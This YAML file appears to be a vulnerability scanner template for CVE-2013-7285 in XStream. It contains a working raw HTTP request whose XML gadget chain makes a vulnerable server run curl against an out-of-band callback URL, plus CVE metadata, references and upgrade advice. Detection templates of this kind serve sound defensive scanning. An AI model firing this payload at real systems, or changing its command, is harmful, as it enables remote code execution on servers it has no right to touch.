http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<sorted-set>\n\
    \    <string>foo</string>\n    <contact class='dynamic-proxy'>\n      <interface>java.lang.Comparable</interface>\n\
    \      <handler class='java.beans.EventHandler'>\n          <target class='java.lang.ProcessBuilder'>\n\
    \              <command>\n                <string>curl</string>\n            \
    \    <string>http://{{interactsh-url}}</string>\n              </command>\n  \
    \        </target>\n          <action>start</action>\n      </handler>\n  </contact>\n\
    </sorted-set>\n"
id: CVE-2013-7285
info:
  author: pwnhxl,vicrack
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2013-7285
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.97383
    epss-score: 0.55716
  description: 'Xstream API before 1.4.6 and 1.4.10 is susceptible to remote code
    execution. If the security framework has not been initialized, an attacker can
    run arbitrary shell commands by manipulating the processed input stream when unmarshaling
    XML or any supported format. This can allow an attacker to obtain sensitive information,
    modify data, and/or gain full control over a compromised system without entering
    necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream <1.4.6/1.4.10 - Remote Code Execution
  reference:
  - https://x-stream.github.io/CVE-2013-7285.html
  - https://www.mail-archive.com/user@xstream.codehaus.org/msg00607.html
  - https://www.mail-archive.com/user@xstream.codehaus.org/msg00604.html
  - https://nvd.nist.gov/vuln/detail/cve-2013-7285
  - https://blog.csdn.net/Xxy605/article/details/126297121
  remediation: 'Upgrade XStream to version 1.4.10 or later to mitigate this vulnerability.

    '
  severity: critical
  tags: cve2013,cve,xstream,deserialization,rce,oast,xstream_project
